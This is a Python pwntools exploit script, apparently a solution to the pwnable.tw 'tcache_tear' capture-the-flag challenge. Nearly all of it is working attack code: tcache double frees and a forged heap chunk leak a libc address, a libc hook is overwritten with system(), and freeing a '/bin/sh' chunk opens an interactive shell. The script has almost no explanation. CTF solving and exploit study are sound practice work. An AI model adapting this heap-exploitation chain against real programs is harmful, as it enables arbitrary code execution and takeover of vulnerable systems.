from pwn import *

e = ELF("./tcache_tear")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = e
context.terminal = ["konsole", "-e"]





def alloc(size, data):
    p.sendlineafter(":", "1")
    p.sendlineafter(":", str(size))
    p.sendafter(":", data)


def free():
    p.sendlineafter(":", "2")
    

def show_name():
    p.sendlineafter(":", "3")



name_addr = 0x602060
chunk_ptr = 0x602088


while True:
    p = process([ld.path, e.path], env={"LD_PRELOAD": libc.path})
    #p = remote("chall.pwnable.tw", 10207)

    #context.log_level="debug"
    



    p.sendlineafter(":", p64(0) + p64(0x41))



    alloc(1, ".")
    free()


    alloc(0x20, ".")
    free()

    alloc(0x30, ".")
    free()

    for i in range(10):
        alloc(0x90, ".")


    forged_chunk = ""

    forged_chunk += p64(0x20)       # prev_size
    forged_chunk += p64(0x501)      # size + prev_inuse
    forged_chunk += "\x00"*0x28
    forged_chunk += p64(0x31)
    forged_chunk += "A"*(0x4f0-0x30)       # filler data
    forged_chunk += p64(0x500)      # prev_size
    forged_chunk += p64(0x71)       # size + prev_inuse
    forged_chunk += "C"*16          # filler data


    alloc(1, "A"*0x10+forged_chunk)


    alloc(0x20, "A")
    free()                  # frees the unsorted chunk for libc pointers


    alloc(0x20, "A")           # aligns the fwd pointers so the fwd of the unsorted
                            # is also the fwd of the free tcache chunk

    alloc(0, "\xe8\x58")


    alloc(0x30, "AAAAAAAAAAAAa")


    alloc(0x40, "AAAA")
    free()
    free()


    alloc(0x40, p64(name_addr+0x10))

    alloc(0x40, "A")

    alloc(0x40, p64(0x69696969))

    free()

    show_name()

    p.recvuntil(":")

    p.recv(16)


    x = p.recv(6)

    print(x)
    libc.address = u64(x.ljust(8, "\x00")) - 0x3ed8e8

    print("libc base address", hex(libc.address))
    print("libc free hook",  hex(libc.sym["__free_hook"]))
    print("libc malloc hook",  hex(libc.sym["__malloc_hook"]))
    print("libc system", hex(libc.sym["system"]))
    
    
    
    
    try:
        alloc(0x30, "A")
        alloc(0x30, p64(libc.sym["system"]))
    except EOFError:
        p.close()
        continue


    #gdb.attach(p, """c""")
    
    alloc(0x20, "/bin/sh\x00")
    free()
    p.interactive()
    
    p.close()












